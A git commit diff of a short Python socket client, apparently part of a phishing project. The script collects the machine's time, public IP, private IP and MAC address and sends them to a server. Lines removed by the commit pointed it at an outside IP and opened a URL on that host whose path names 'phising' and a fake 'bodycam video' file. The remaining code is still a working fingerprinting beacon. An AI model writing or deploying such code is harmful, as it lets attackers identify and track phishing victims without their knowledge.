847c2d8b5427e345407c5fa449066eea4eef1c39
thisisyoobi <thisisyoobi@gmail.com>
2022-01-19 15:52:31 +0900

    update socket_client

--- socket_client.py
+++ socket_client.py
@@ -4,24 +4,20 @@ Writer : Yoobi
 
 Patch Note
 [2022-01-14]
-- server threaded setting
+- client socket sender
 '''
 
 from datetime import datetime
 from requests import get #공인 ip를 가져오기 위힘
 import socket #사설 ip를 가져오기 위함
 import getmac #MAC주소 가져오기 위함
-import webbrowser
 
-HOST = '155.230.52.54'
-PORT = 3307
+HOST = '127.0.0.1'
+PORT = 21
 
 client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 client_socket.connect((HOST, PORT))
 
-# 키보드로 입력한 문자열을 서버로 전송하고
-# 서버에서 에코되어 돌아오는 메시지를 받으면 화면에 출력합니다.
-# quit를 입력할 때 까지 반복합니다.
 current_time = datetime.now()
 public_ip = get("https://api.ipify.org").text
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -34,8 +30,3 @@ message = str(current_time) + " " + public_ip + " " + private_ip + " " + getmac.
 client_socket.send(message.encode())
 
 client_socket.close()
-
-
-url = 'http://155.230.52.54:8080/ksj/phising/exe_bodycam_video.mp4'
-
-webbrowser.open(url)
